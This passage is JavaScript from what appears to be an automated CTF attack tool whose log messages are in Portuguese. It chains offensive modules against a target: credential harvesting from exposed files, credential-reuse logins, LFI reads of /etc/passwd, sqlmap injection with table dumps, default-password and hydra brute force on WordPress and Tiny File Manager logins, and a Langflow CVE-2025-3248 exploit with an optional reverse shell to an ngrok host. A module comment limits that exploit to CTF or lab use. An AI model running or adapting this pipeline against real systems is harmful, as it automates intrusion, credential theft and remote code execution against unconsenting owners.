        `Hostnames (/etc/hosts): mesmo curl web que no IP (portas nmap + seed http://<nome>/) para: ${names.join(', ')} — o SO tem de resolver para ${ip}`,
        'info',
      );
      try {
        let urlCount = 0;
        for (const h of names) {
          const chunk = await curlWebFromNmapForHost({
            host: h,
            nmapRows,
            timeoutMs: 12000,
            maxBodyBytes: 250000,
            log,
            hostLabel: `${h} → ${ip}`,
            /** No modo só hostnames, cobre também portas HTTP típicas além do que o nmap classificou como http. */
            alwaysIncludeDefaultWebPorts: useHostsOnlyWeb,
          });
          for (const row of chunk) {
            webResponses.push({
              ...row,
              __via: 'etc-hosts-name',
              __vhostName: h,
            });
            urlCount += 1;
          }
        }
        etcHostsSummary.urls = urlCount;
        log(
          `Hostnames (/etc/hosts): ${urlCount} resposta(s) — pipeline idêntico ao do IP (links/robots/dir/… depois usam tudo)`,
          urlCount ? 'success' : 'warn',
        );
      } catch (e) {
        log(`Hostnames (/etc/hosts): ${e?.message || String(e)}`, 'warn');
      }
    } else {
      log(
        'Hostnames (/etc/hosts): módulo ON mas sem nomes — cola hostnames na UI ou mapeia o IP do alvo em /etc/hosts desta máquina (Node). Opcional: GHOSTCTF_SKIP_LOCAL_ETC_HOSTS=1 para não ler o ficheiro.',
        'warn',
      );
    }
  } else {
    log('Hostnames (/etc/hosts): OFF (ative em Modules se usares nomes no /etc/hosts)', 'info');
  }

  /** @type {{ enabled: boolean; hits: number; baseDomain: string }} */
  let vhostFuzzSummary = { enabled: false, hits: 0, baseDomain: '' };
  if (Array.isArray(modules) && modules.includes('vhostPrefixFuzz')) {
    vhostFuzzSummary.enabled = true;
    const bd = String(vhostBaseDomain || '').trim();
    vhostFuzzSummary.baseDomain = bd;
    if (!bd) {
      log('VHost prefix fuzz: indica o domínio apex (ex.: projects-blogo.sy) na caixa dedicada.', 'warn');
    } else {
      try {
        log(`VHost prefix fuzz: GET http://${ip}/ com Host: <prefix>.${bd} (lista interna + extra)...`, 'info');
        const vf = await runVhostPrefixFuzz({
          ip,
          baseDomain: bd,
          extraPrefixes: vhostFuzzExtraPrefixes,
          log,
        });
        const hitList = Array.isArray(vf.hits) ? vf.hits : [];
        vhostFuzzSummary.hits = hitList.length;
        for (const h of hitList) {
          addFinding(
            {
              type: 'endpoint',
              prio: 'med',
              score: 62,
              value: `VHost candidato: Host: ${h.hostHeader}`,
              meta: `HTTP ${h.status} · corpo=${h.bodyLen} B vs baseline ${h.baselineLen} B (Δ=${h.delta})`,
              url: `http://${ip}/`,
            },
            'endpoints',
          );
          intel(`VHOST: curl -sI "http://${ip}/" -H "Host: ${h.hostHeader}"`);
        }
        if (!hitList.length) log('VHost prefix fuzz: nenhum prefixo com resposta claramente distinta do baseline.', 'info');
      } catch (e) {
        log(`VHost prefix fuzz: ${e?.message || String(e)}`, 'warn');
      }
    }
  }

  /** @type {{ fetched: number; tried: number; origins: number }} */
  let ctfFlagPathProbeSummary = { fetched: 0, tried: 0, origins: 0 };
  let robotsFetched = 0;
  let robotsDisallowFetched = 0;
  try {
    const rb = await appendRobotsTxtResponses(webResponses, {
      ip,
      log,
      timeoutMs: 10000,
      maxBodyBytes: 128000,
      skipIpFallback: useHostsOnlyWeb,
      originHostFallbacks: useHostsOnlyWeb ? namesForEtc : [],
    });
    robotsFetched = rb.fetched || 0;
    robotsDisallowFetched = rb.disallowFetched || 0;
  } catch (e) {
    log(`robots.txt: ${e?.message || String(e)}`, 'warn');
  }

  let vhostSitemapSummary = { enabled: false, hostsTested: 0, vhostFetched: 0, sitemapFetched: 0, wellKnownFetched: 0 };
  if (Array.isArray(modules) && modules.includes('vhostSitemapProbe')) {
    vhostSitemapSummary.enabled = true;
    try {
      log('VHost/Sitemap probe: a testar Host header + sitemap.xml + .well-known...', 'info');
      const vs = await runVhostAndSitemapProbe(webResponses, {
        ip,
        log,
        timeoutMs: 12000,
        maxBodyBytes: 220000,
        seedHostnames: namesForEtc.length ? namesForEtc : [],
        skipIpOriginFallback: useHostsOnlyWeb,
      });
      vhostSitemapSummary = {
        enabled: true,
        hostsTested: Number(vs?.hostsTested || 0),
        vhostFetched: Number(vs?.vhostFetched || 0),
        sitemapFetched: Number(vs?.sitemapFetched || 0),
        wellKnownFetched: Number(vs?.wellKnownFetched || 0),
      };
      log(
        `VHost/Sitemap: hosts=${vhostSitemapSummary.hostsTested} · vhost=${vhostSitemapSummary.vhostFetched} · sitemap=${vhostSitemapSummary.sitemapFetched} · well-known=${vhostSitemapSummary.wellKnownFetched}`,
        'info',
      );
    } catch (e) {
      log(`VHost/Sitemap probe: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('VHost/Sitemap probe: OFF (ative em Modules)', 'info');
  }

  try {
    const fp = await appendCtfFlagPathHttpProbes(webResponses, { ip, log, timeoutMs: 9000, maxBodyBytes: 140000 });
    ctfFlagPathProbeSummary = {
      fetched: Number(fp?.fetched || 0),
      tried: Number(fp?.tried || 0),
      origins: Number(fp?.origins || 0),
    };
    if (ctfFlagPathProbeSummary.tried) {
      log(
        `CTF flag-paths HTTP: ${ctfFlagPathProbeSummary.tried} GET(s) em ${ctfFlagPathProbeSummary.origins} origem(ns) (/flag, /flag.txt, …)`,
        'info',
      );
    }
  } catch (e) {
    log(`CTF flag-path probe: ${e?.message || String(e)}`, 'warn');
  }

  const countAfterInitialCurl = webResponses.length;

  /** @type {{ enabled: boolean; fetched: number; comments: number; creds: number }} */
  const disclosureSummary = { enabled: false, fetched: 0, comments: 0, creds: 0 };
  /** @type {{ enabled: boolean; attempts: number; hits: number }} */
  const credReuseSummary = { enabled: false, attempts: 0, hits: 0 };
  /** @type {Array<{username:string,password:string,source?:string,url?:string}>} */
  let disclosureCreds = [];

  if (Array.isArray(modules) && modules.includes('disclosureProbe')) {
    disclosureSummary.enabled = true;
    try {
      log('Disclosure Hunt: comentários/ficheiros sensíveis/credenciais expostas...', 'info');
      const d = await runDisclosureHunt(webResponses, { ip, log, timeoutMs: 10000 });
      disclosureSummary.fetched = Number(d?.fetched || 0);
      const comments = Array.isArray(d?.comments) ? d.comments : [];
      const creds = Array.isArray(d?.credentials) ? d.credentials : [];
      disclosureCreds = creds.slice(0, 30);
      disclosureSummary.comments = comments.length;
      disclosureSummary.creds = creds.length;
      for (const c of comments.slice(0, 12)) {
        addFinding(
          {
            type: 'secret',
            prio: 'med',
            score: 68,
            value: `Comentário HTML suspeito @ ${c.url}`,
            meta: c.text,
            url: c.url,
          },
          'secrets',
        );
      }
      for (const cr of creds.slice(0, 12)) {
        const wpExtra =
          cr.wpDbHost || cr.wpDbName
            ? ` · DB_NAME=${cr.wpDbName || '?'} · DB_HOST=${cr.wpDbHost || '?'}`
            : '';
        addFinding(
          {
            type: 'secret',
            prio: 'high',
            score: 88,
            value: `Credencial potencial: ${cr.username}:${cr.password}`,
            meta: `source=${cr.source} · url=${cr.url || '-'}${wpExtra}`,
            url: cr.url || null,
          },
          'secrets',
        );
        if (String(cr.source || '').includes('wp-config') && (cr.username || cr.password)) {
          const h = cr.wpDbHost || 'localhost';
          intel(
            `wp-config → MariaDB: mysql -h ${h} -u ${cr.username} -p   (se localhost, entra por SSH no alvo primeiro)`,
          );
        }
      }
      log(`Disclosure Hunt: fetched=${disclosureSummary.fetched} · comments=${comments.length} · creds=${creds.length}`, 'info');

      if (Array.isArray(modules) && modules.includes('credReuseProbe') && creds.length) {
        credReuseSummary.enabled = true;
        const rr = await runCredentialReuseProbe({
          ip,
          nmapRows,
          webResponses,
          credentials: creds,
          log,
        });
        credReuseSummary.attempts = Number(rr?.attempts || 0);
        const hits = Array.isArray(rr?.hits) ? rr.hits : [];
        credReuseSummary.hits = hits.length;
        for (const h of hits) {
          addFinding(
            {
              type: 'endpoint',
              prio: 'high',
              score: 93,
              value: `Credential reuse OK (${h.kind})`,
              meta: h.url
                ? `${h.username}:${h.password} @ ${h.url} · ${h.evidence}`
                : `${h.username}:${h.password} @ ${ip}:${h.port} · ${h.evidence}`,
              url: h.url || `ftp://${ip}:${h.port}/`,
            },
            'endpoints',
          );
        }
        if (!hits.length) log(`Credential reuse: sem sucesso (attempts=${credReuseSummary.attempts})`, 'info');
      } else if (Array.isArray(modules) && modules.includes('credReuseProbe')) {
        credReuseSummary.enabled = true;
        log('Credential reuse: sem credenciais extraídas no disclosure.', 'info');
      }
    } catch (e) {
      log(`Disclosure/CredReuse: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('Disclosure Hunt: OFF (ative em Modules)', 'info');
    if (Array.isArray(modules) && modules.includes('credReuseProbe')) {
      credReuseSummary.enabled = true;
      log('Credential reuse: requer Disclosure Hunt ON para alimentar credenciais.', 'warn');
    }
  }

  for (const r of webResponses) {
    if (!r.status) continue;
    if (!r.bodyText && r.__via !== 'robots.txt' && r.__via !== 'robots-disallow' && r.__via !== 'etc-hosts-name')
      continue;
    const via =
      r.__via === 'robots.txt'
        ? ' · via=robots.txt'
        : r.__via === 'robots-disallow'
          ? ` · via=robots Disallow · path=${String(r.__disallowPath || '?')} · robots=${String(r.__robotsSource || '?')}`
          : r.__via === 'etc-hosts-name'
            ? ` · via=/etc/hosts · nome=${String(r.__vhostName || '?')}`
            : '';
    addFinding(
      {
        type: 'tech',
        prio: 'low',
        score: 20,
        value: `HTTP ${r.status} @ ${r.url}`,
        meta: `tech=${(r.tech || []).slice(0, 5).join(' · ') || '—'}${via}`,
        url: r.url,
      },
      'endpoints',
    );
  }

  // Segue links no HTML (mesmo host que o IP), p.ex. index → noticias.php (flags em comentários / outras páginas)
  let linkPagesFetched = 0;
  try {
    log('Rastreio de links no HTML (href → curl no mesmo IP/host que resolve para o alvo)...', 'info');
    const linkRes = await expandWebResponsesWithLinkCrawl(webResponses, {
      ip,
      log,
      timeoutMs: 15000,
      maxBodyBytes: 350000,
      /** Listagens grandes (ex. Python em /) — seguir mais níveis até ficheiros tipo shell. */
      maxDepth: 4,
      maxNewFetches: ghostctfPositiveIntEnv('GHOSTCTF_MAX_LINK_CRAWL_FETCHES', 150),
    });
    linkPagesFetched = linkRes.fetched || 0;
    if (linkPagesFetched) log(`HTML links: ${linkPagesFetched} página(s) extra com curl`, 'success');
    else log('HTML links: nenhum URL novo. Ver logs “[http] link do HTML”.', 'info');
  } catch (e) {
    log(`HTML link crawl: ${e?.message || String(e)}`, 'warn');
  }

  /** @type {{ enabled: boolean; pages: number; hints: number }} */
  let uploadSurfaceSummary = { enabled: false, pages: 0, hints: 0 };
  if (Array.isArray(modules) && modules.includes('uploadSurfaceProbe')) {
    uploadSurfaceSummary.enabled = true;
    try {
      log('Upload surface: HTML por type=file / multipart/form-data…', 'info');
      const up = runUploadSurfaceProbe(webResponses);
      uploadSurfaceSummary.pages = Number(up.pages || 0);
      uploadSurfaceSummary.hints = Number(up.hints || 0);
      for (const fd of up.findings || []) {
        addFinding(fd, 'endpoints');
      }
      if (uploadSurfaceSummary.hints) {
        log(`Upload surface: ${uploadSurfaceSummary.hints} formulário(s) em ${uploadSurfaceSummary.pages} página(s)`, 'success');
      } else {
        log('Upload surface: sem indícios em HTML obtido por curl.', 'info');
      }
    } catch (e) {
      log(`Upload surface: ${e?.message || String(e)}`, 'warn');
    }
  }

  /** @type {{ enabled: boolean; fetched: number; urls: string[] }} */
  let openapiSummary = { enabled: false, fetched: 0, urls: [] };
  if (Array.isArray(modules) && modules.includes('openapiProbe')) {
    openapiSummary.enabled = true;
    try {
      log('OpenAPI probe: GET /openapi.json, /v3/api-docs, … por origem HTTP descoberta...', 'info');
      const oa = await runOpenApiDiscovery({
        webResponses,
        log,
        timeoutMs: 12000,
        maxBodyBytes: 250000,
        appendResponses: true,
      });
      openapiSummary.fetched = Number(oa?.fetched || 0);
      openapiSummary.urls = Array.isArray(oa?.urls) ? oa.urls : [];
      for (const u of openapiSummary.urls) {
        addFinding(
          {
            type: 'endpoint',
            prio: 'med',
            score: 58,
            value: 'OpenAPI / documento API provável',
            meta: String(u),
            url: u,
          },
          'endpoints',
        );
      }
    } catch (e) {
      log(`OpenAPI probe: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('OpenAPI probe: OFF (ative em Modules)', 'info');
  }

  /** @type {{ enabled: boolean; hits: number; verticesPosted: boolean; attempts: number }} */
  let langflowExploitSummary = { enabled: false, hits: 0, verticesPosted: false, attempts: 0 };
  if (Array.isArray(modules) && modules.includes('langflowExploitProbe')) {
    langflowExploitSummary.enabled = true;
    log(
      'Langflow exploit (CVE-2025-3248 / vértices): módulo CRÍTICO — só em CTF/lab explícito.',
      'warn',
    );
    try {
      const readPaths = ['/etc/passwd'];
      if (langflowAlsoTryFlagPath) readPaths.push('/flag.txt');
      const lf = await runLangflowExploitProbe({
        webResponses,
        ip,
        log,
        tryAllOrigins: Boolean(langflowTryAllOrigins),
        hostHeader: String(langflowHostHeader || '').trim(),
        readPaths,
        verticesReverseShell: Boolean(langflowVerticesShell),
        ngrokHost: String(langflowNgrokHost || '').trim(),
        ngrokPort: Number(langflowNgrokPort) || 0,
        buildFlowId: String(langflowBuildFlowId || '').trim(),
      });
      langflowExploitSummary.hits = Array.isArray(lf.validateHits) ? lf.validateHits.length : 0;
      langflowExploitSummary.verticesPosted = Boolean(lf.verticesPosted);
      langflowExploitSummary.attempts = Number(lf.validateAttempts || 0);
      for (const h of lf.validateHits || []) {
        addFinding(
          {
            type: 'endpoint',
            prio: 'high',
            score: 92,
            value: `Langflow validate/code — possível exfil (${h.readPath})`,
            meta: `HTTP ${h.httpCode} · ${h.snippet?.slice(0, 900) || ''}`,
            url: h.url,
          },
          'endpoints',
        );
      }
      ingestFlagFindingsFromWebResponses({
        webResponses: (lf.validateHits || []).map((h) => ({
          url: h.url,
          finalUrl: h.url,
          status: h.httpCode,
          headersText: '',
          bodyText: h.snippet || '',
        })),
        platformId,
        foundFlagSet,
        addFinding,
        log,
        maxTextLen: 50_000,
      });
    } catch (e) {
      log(`Langflow exploit: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('Langflow exploit: OFF (ative em Modules)', 'info');
  }

  for (let i = countAfterInitialCurl; i < webResponses.length; i += 1) {
    const r = webResponses[i];
    if (!r || !r.status || !r.bodyText) continue;
    addFinding(
      {
        type: 'tech',
        prio: 'low',
        score: 20,
        value: `HTTP ${r.status} @ ${r.url}`,
        meta: `tech=${(r.tech || []).slice(0, 5).join(' · ') || '—'} · via=html-link`,
        url: r.url,
      },
      'endpoints',
    );
  }

  // Playbook atualizado (pós-web probe)
  try {
    const sug = buildCtfPlaybookSuggestions({ ip, findings });
    for (const s of sug.slice(0, 8)) {
      intel(`PLAYBOOK (${String(s.prio).toUpperCase()}): ${s.title}`);
      for (const step of s.steps.slice(0, 6)) intel(`  - ${step}`);
    }
  } catch (e) {
    log(`playbook: ${e?.message || String(e)}`, 'warn');
  }

  // Se a flag já aparecer em headers/body do primeiro probe,
  // emitimos imediatamente e continuamos o pipeline.
  ingestFlagFindingsFromWebResponses({
    webResponses,
    platformId,
    foundFlagSet,
    addFinding,
    log,
    maxTextLen: 500_000,
  });
  markTiming('afterAliveWebProbe');
  pipe('alive', 'done');
  progress(52);

  // 5) SURFACE / DIR ENUM (mapa para "surface")
  pipe('surface', 'active');
  progress(58);
  log('Enumeração de diretórios (ffuf + gobuster + dirb, em paralelo) nas seeds web…', 'info');

  let urlsSeedUniq = collectDirEnumSeedUrls(webResponses, { maxOrigins: 8 });
  if (!urlsSeedUniq.length) {
    const seedSeen = new Set();
    for (const r of webResponses) {
      if (!r || !r.status || !r.url) continue;
      const k = String(r.url).split('#')[0];
      if (seedSeen.has(k)) continue;
      seedSeen.add(k);
      urlsSeedUniq.push(k);
      if (urlsSeedUniq.length >= 4) break;
    }
  }

  const discoveredUrls = new Set();
  /** @type {Record<string, { n: number; err?: string }>} */
  const dirEnumToolsAgg = {};
  for (const baseUrl of urlsSeedUniq) {
    const u = String(baseUrl || '');
    if (!u) continue;
    const enumRes = await dirEnumAllTools({ baseUrl: u, log, timeoutMs: 240000, maxMergedUrls: 120 });
    if (enumRes?.tools && typeof enumRes.tools === 'object') {
      for (const [k, v] of Object.entries(enumRes.tools)) {
        if (!dirEnumToolsAgg[k]) dirEnumToolsAgg[k] = { n: 0 };
        dirEnumToolsAgg[k].n += Number(v?.n) || 0;
        if (v?.err) dirEnumToolsAgg[k].err = v.err;
      }
    }
    if (!Array.isArray(enumRes.urls)) continue;
    for (const d of enumRes.urls) discoveredUrls.add(d);
  }

  // curl nas URLs descobertas
  let pagesFetched = 0;
  for (const u of [...discoveredUrls].slice(0, 50)) {
    try {
      // reaproveita curlWebFromNmap? aqui só precisamos de um curl simples.
      // import local pra evitar overhead:
      const { curlWebSingle } = await import('./web-curl-single.js');
      const r = await curlWebSingle({ url: u, timeoutMs: 12000, maxBodyBytes: 250000 });
      pagesFetched++;
      // salva findings “endpoint-like” (não é essencial pro flag scan)
      if (r.status) {
        addFinding(
          {
            type: 'endpoint',
            prio: 'low',
            score: 44,
            value: u,
            meta: `curl status=${r.status}`,
            url: u,
          },
          'endpoints',
        );
      }
      // guarda evidência agregada pra scan de flags
      r.__evidence = { headersText: r.headersText, bodyText: r.bodyText };
      webResponses.push(r);
    } catch {
      // ignore
    }
  }

  log(`Páginas extra (curl das dirs): ${pagesFetched}`, pagesFetched ? 'success' : 'info');
  markTiming('afterDirEnumSurface');
  pipe('surface', 'done');
  progress(70);

  // 6) URLS / DISCOVERY — links HTML já cobertos em “alive”; robots/sitemap podem ser acrescentados depois
  pipe('urls', 'active');
  log('Discovery URLs: robots.txt + links HTML + ffuf/gobuster/dirb.', 'info');
  markTiming('afterUrlDiscoveryLabel');
  pipe('urls', 'done');

  // 7) PARAM DISCOVERY / FLAG SCAN (mapa para "params")
  pipe('params', 'active');
  progress(78);

  /** @type {{ attempts: number; hits: number }} */
  const lfiSummary = { attempts: 0, hits: 0 };
  /** @type {{ attempts: number; hits: number; enabled: boolean }} */
  const sqlmapSummary = { attempts: 0, hits: 0, enabled: false };
  if (Array.isArray(modules) && modules.includes('lfiProbe')) {
    try {
      const lfiSeedUrls = [];
      for (const r of webResponses || []) {
        if (!r?.url) continue;
        lfiSeedUrls.push(String(r.url));
        if (r.finalUrl) lfiSeedUrls.push(String(r.finalUrl));
      }
      const lfi = await runLfiPasswdProbe({
        urls: lfiSeedUrls,
        log,
        /** Inclui tentativas em .php sem ? (param inject) — orçamento maior. */
        maxAttempts: 96,
        timeoutMs: 12000,
        maxBodyBytes: 180000,
      });
      lfiSummary.attempts = Number(lfi?.attempts || 0);
      const hits = Array.isArray(lfi?.hits) ? lfi.hits : [];
      lfiSummary.hits = hits.length;
      for (const h of hits) {
        addFinding(
          {
            type: 'param',
            prio: 'high',
            score: 94,
            value: `Possível LFI via ${h.param} em ${h.baseUrl}`,
            meta: `payload=${h.payload} · status=${h.status} · evidência=${h.evidence}`,
            url: h.testUrl || h.baseUrl,
          },
          'params',
        );
        log(`LFI provável: ${h.testUrl} (${h.evidence})`, 'success');
        if (h.snippet) intel(`LFI snippet: ${h.snippet}`);
      }
      // Cadeia LFI contextual automática (mais 1 passo)
      if (hits.length) {
        const ctx = await runLfiContextProbe({
          lfiHits: hits,
          log,
          timeoutMs: 12000,
          maxBodyBytes: 220000,
          maxAttempts: 18,
        });
        const chits = Array.isArray(ctx?.hits) ? ctx.hits : [];
        for (const c of chits) {
          const isRcePotential = String(c.classification || '').toLowerCase() === 'potential_rce';
          addFinding(
            {
              type: 'param',
              prio: isRcePotential ? 'high' : 'med',
              score: isRcePotential ? 97 : 84,
              value: `LFI contextual hit via ${c.param} (${c.payload})`,
              meta: `status=${c.status} · classe=${c.classificationLabel || c.classification || 'read'} · evidência=${c.evidence}`,
              url: c.testUrl || c.baseUrl,
            },
            'params',
          );
          if (c.snippet) intel(`LFI context: ${c.snippet}`);
        }
        if (chits.length) log(`LFI context probe: ${chits.length} hit(s) extra`, 'success');
      }
      if (!hits.length) {
        log(`LFI probe: sem evidência de /etc/passwd (tentativas=${lfiSummary.attempts})`, 'info');
      }
    } catch (e) {
      log(`LFI probe: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('LFI probe: OFF (ative em Modules)', 'info');
  }

  /** @type {{ enabled: boolean; hits: number }} */
  const tinyFmSummary = { enabled: false, hits: 0 };
  if (Array.isArray(modules) && modules.includes('tinyFmProbe')) {
    tinyFmSummary.enabled = true;
    try {
      log('Tiny File Manager: teste de credenciais comuns (CTF)...', 'warn');
      const tf = await runTinyFileManagerProbe(webResponses, { log, timeoutMs: 12000, maxOrigins: 4 });
      const tfHits = Array.isArray(tf?.hits) ? tf.hits : [];
      tinyFmSummary.hits = tfHits.length;
      for (const h of tfHits) {
        addFinding(
          {
            type: 'secret',
            prio: 'high',
            score: 94,
            value: `TinyFM login provável: ${h.username}`,
            meta: `password=${h.password} · ${h.url}`,
            url: h.url,
          },
          'secrets',
        );
        intel(`TinyFM: ${h.username}:${h.password} @ ${h.url}`);
      }
      if (!tfHits.length) log('TinyFM probe: sem match com credenciais padrão', 'info');
    } catch (e) {
      log(`TinyFM probe: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('TinyFM probe: OFF (ative em Modules)', 'info');
  }

  if (Array.isArray(modules) && modules.includes('sqlmapProbe')) {
    sqlmapSummary.enabled = true;
    try {
      const sqlmapSeedUrls = [];
      for (const r of webResponses || []) {
        if (!r?.url) continue;
        sqlmapSeedUrls.push(String(r.url));
        if (r.finalUrl) sqlmapSeedUrls.push(String(r.finalUrl));
      }
      const sm = await runSqlmapProbe({
        urls: sqlmapSeedUrls,
        log,
        maxTargets: 6,
        timeoutPerTargetMs: 150000,
      });
      if (!sm.ok && sm.reason === 'sqlmap_missing') {
        log('sqlmap probe: sqlmap não encontrado no PATH.', 'warn');
      } else {
        sqlmapSummary.attempts = Number(sm?.attempts || 0);
        const hits = Array.isArray(sm?.hits) ? sm.hits : [];
        sqlmapSummary.hits = hits.length;
        for (const h of hits) {
          const seqMeta = [
            h.evidence,
            h.currentDb ? `currentDb=${h.currentDb}` : null,
            h.tables?.length ? `tables=${h.tables.slice(0, 6).join(',')}` : null,
            h.dumpTable ? `dumpTable=${h.dumpTable}` : null,
          ]
            .filter(Boolean)
            .join(' · ');
          addFinding(
            {
              type: 'sqli',
              prio: h.dbs?.length ? 'high' : 'med',
              score: h.dbs?.length ? 95 : 86,
              value: `Possível SQLi via ${h.param} em ${h.url}`,
              meta: `sqlmap --batch --level=3 --risk=3 --dbs · ${seqMeta || h.evidence}`,
              url: h.url,
            },
            'params',
          );
          log(`SQLMap provável: ${h.param} @ ${h.url} (${h.evidence})`, 'success');
          if (h.currentDb) intel(`SQLMap chain: current-db=${h.currentDb}`);
          if (h.tables?.length) intel(`SQLMap chain: tables(${h.currentDb || '-'}) => ${h.tables.slice(0, 8).join(', ')}`);
          if (h.dumpTable && h.dumpPreview) intel(`SQLMap chain dump ${h.dumpTable}: ${h.dumpPreview}`);
        }
        if (!hits.length) {
          log(`sqlmap probe: sem evidência (alvos testados=${sqlmapSummary.attempts})`, 'info');
        }
      }
    } catch (e) {
      log(`sqlmap probe: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('sqlmap probe: OFF (ative em Modules)', 'info');
  }

  /** @type {{ enabled: boolean; attempts: number; hits: number }} */
  const sqlmapWsSummary = { enabled: false, attempts: 0, hits: 0 };
  if (Array.isArray(modules) && modules.includes('sqlmapWsProbe')) {
    sqlmapWsSummary.enabled = true;
    try {
      log('sqlmap WebSocket: URLs ws:// / wss:// nos corpos HTML...', 'info');
      const smw = await runSqlmapWsProbe({
        webResponses,
        log,
        maxTargets: 3,
        timeoutPerTargetMs: 120000,
      });
      if (!smw.ok && smw.reason === 'sqlmap_missing') {
        log('sqlmap WebSocket: sqlmap não encontrado no PATH.', 'warn');
      } else {
        sqlmapWsSummary.attempts = Number(smw?.attempts || 0);
        const wHits = Array.isArray(smw?.hits) ? smw.hits : [];
        sqlmapWsSummary.hits = wHits.length;
        for (const h of wHits) {
          addFinding(
            {
              type: 'sqli',
              prio: h.dbs?.length ? 'high' : 'med',
              score: h.dbs?.length ? 94 : 85,
              value: `Possível SQLi WebSocket (${h.data})`,
              meta: `sqlmap ws · ${h.evidence || ''} · ${h.url}`,
              url: h.url,
            },
            'params',
          );
          log(`SQLMap WS provável: ${h.url} (${h.evidence})`, 'success');
        }
        if (!wHits.length) {
          log(`sqlmap WebSocket: sem evidência (tentativas=${sqlmapWsSummary.attempts})`, 'info');
        }
      }
    } catch (e) {
      log(`sqlmap WebSocket: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('sqlmap WebSocket: OFF (ative em Modules)', 'info');
  }

  /** @type {{ enabled: boolean; originsTested: number; fetched: number; findings: number }} */
  const wpFocusSummary = { enabled: false, originsTested: 0, fetched: 0, findings: 0 };
  /** @type {string[]} */
  let lastWpTargetsForHydra = [];
  /** @type {{ enabled: boolean; cracked: boolean; username?: string; password?: string; error?: string }} */
  let wpHydraBruteSummary = { enabled: false, cracked: false };
  if (Array.isArray(modules) && modules.includes('wpFocusProbe')) {
    wpFocusSummary.enabled = true;
    try {
      const wp = await runWordpressFocusProbe(webResponses, { log, timeoutMs: 12000 });
      lastWpTargetsForHydra = Array.isArray(wp?.wpTargets) ? wp.wpTargets : [];
      wpFocusSummary.originsTested = Number(wp?.originsTested || 0);
      wpFocusSummary.fetched = Number(wp?.fetched || 0);
      const ff = Array.isArray(wp?.findings) ? wp.findings : [];
      wpFocusSummary.findings = ff.length;
      for (const f of ff.slice(0, 40)) {
        addFinding(
          {
            type: 'tech',
            prio: /plugin detectado|version/i.test(String(f.value || '')) ? 'med' : 'low',
            score: /plugin detectado|version/i.test(String(f.value || '')) ? 62 : 42,
            value: f.value,
            meta: `${f.meta || 'wp-focus'}${f.status ? ` · status=${f.status}` : ''}`,
            url: f.url || null,
          },
          'endpoints',
        );
      }
      log(`WordPress focus: origins=${wpFocusSummary.originsTested} · fetched=${wpFocusSummary.fetched} · findings=${wpFocusSummary.findings}`, 'info');
      const wpVersion = String(wp?.wpVersion || '').trim() || 'unknown';
      const wpPluginsN = Array.isArray(wp?.plugins) ? wp.plugins.length : 0;
      const wpUsersN = Array.isArray(wp?.users) ? wp.users.length : 0;
      const wpXmlrpc = wp?.xmlrpcEnabled ? 'on' : 'off';
      log(`WP summary: version=${wpVersion} · plugins=${wpPluginsN} · users=${wpUsersN} · xmlrpc=${wpXmlrpc}`, 'info');
      intel(`WP summary => version:${wpVersion} plugins:${wpPluginsN} users:${wpUsersN} xmlrpc:${wpXmlrpc}`);

      // Credential reuse contextual para wp-login (usa creds extraídas + users enum)
      if (Array.isArray(modules) && modules.includes('credReuseProbe') && disclosureCreds.length) {
        const wpr = await runWordpressCredentialReuse({
          credentials: disclosureCreds,
          wpTargets: Array.isArray(wp?.wpTargets) ? wp.wpTargets : [],
          wpUsers: Array.isArray(wp?.users) ? wp.users : [],
          log,
        });
        const hits = Array.isArray(wpr?.hits) ? wpr.hits : [];
        credReuseSummary.attempts += Number(wpr?.attempts || 0);
        credReuseSummary.hits += hits.length;
        for (const h of hits) {
          addFinding(
            {
              type: 'endpoint',
              prio: 'high',
              score: 96,
              value: `Credential reuse OK (${h.kind})`,
              meta: `${h.username}:${h.password} @ ${h.url} · ${h.evidence}`,
              url: h.url,
            },
            'endpoints',
          );
        }
      }

      // WPScan opcional (mais pesado): só quando explicitamente ligado
      if (Array.isArray(modules) && modules.includes('wpScanProbe')) {
        const targets = Array.isArray(wp?.wpTargets) ? wp.wpTargets.slice(0, 2) : [];
        if (targets.length) {
          log(`wpscan: ${targets.length} target(s) WordPress`, 'info');
          for (const t of targets) {
            const res = await runWpscanJson({
              targetUrl: t,
              detectionMode: 'mixed',
              timeoutMs: 240000,
              log,
            });
            if (res?.json) {
              const wf = extractWpscanFindings({ targetUrl: t, wpscanJson: res.json });
              if (wf.length) {
                log(`wpscan ${t} -> ${wf.length} finding(s)`, 'success');
                for (const f of wf.slice(0, 40)) addFinding(f, 'endpoints');
              } else {
                log(`wpscan ${t}: sem findings relevantes`, 'info');
              }
            } else {
              log(`wpscan ${t}: falha/sem JSON (${res?.error || 'unknown'})`, 'warn');
            }
          }
        } else {
          log('wpscan: WordPress não confirmado no foco -> skip', 'info');
        }
      } else {
        log('wpscan: OFF (ative em Modules)', 'info');
      }
    } catch (e) {
      log(`WordPress focus: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('WordPress focus: OFF (ative em Modules)', 'info');
  }

  if (Array.isArray(modules) && modules.includes('hydraWpBruteProbe')) {
    wpHydraBruteSummary.enabled = true;
    log('WP brute (hydra): http-post-form em wp-login.php — subset de passwords.', 'warn');
    try {
      const wpLoginUrls = new Set();
      for (const b of lastWpTargetsForHydra) {
        const base = String(b || '').replace(/\/$/, '');
        if (base) wpLoginUrls.add(`${base}/wp-login.php`);
      }
      for (const r of webResponses || []) {
        const raw = String(r?.finalUrl || r?.url || '').split('#')[0];
        if (!raw || !/\/wp-login\.php/i.test(raw)) continue;
        try {
          const x = new URL(raw);
          wpLoginUrls.add(`${x.origin}/wp-login.php`);
        } catch {
          wpLoginUrls.add(raw);
        }
      }
      const uniq = [...wpLoginUrls].slice(0, 5);
      const hr = await runWpHydraBrute({
        wpLoginUrls: uniq,
        usernamesRaw: hydraWpBruteUsers,
        wordlistPath: hydraWpBruteWordlistPath,
        maxPasswords: Math.min(500, Math.max(20, Number(hydraWpBruteMaxPasswords) || 150)),
        log,
        timeoutMs: 240000,
      });
      if (hr.cracked && hr.username && hr.password) {
        wpHydraBruteSummary.cracked = true;
        wpHydraBruteSummary.username = hr.username;
        wpHydraBruteSummary.password = hr.password;
        addFinding(
          {
            type: 'secret',
            prio: 'high',
            score: 96,
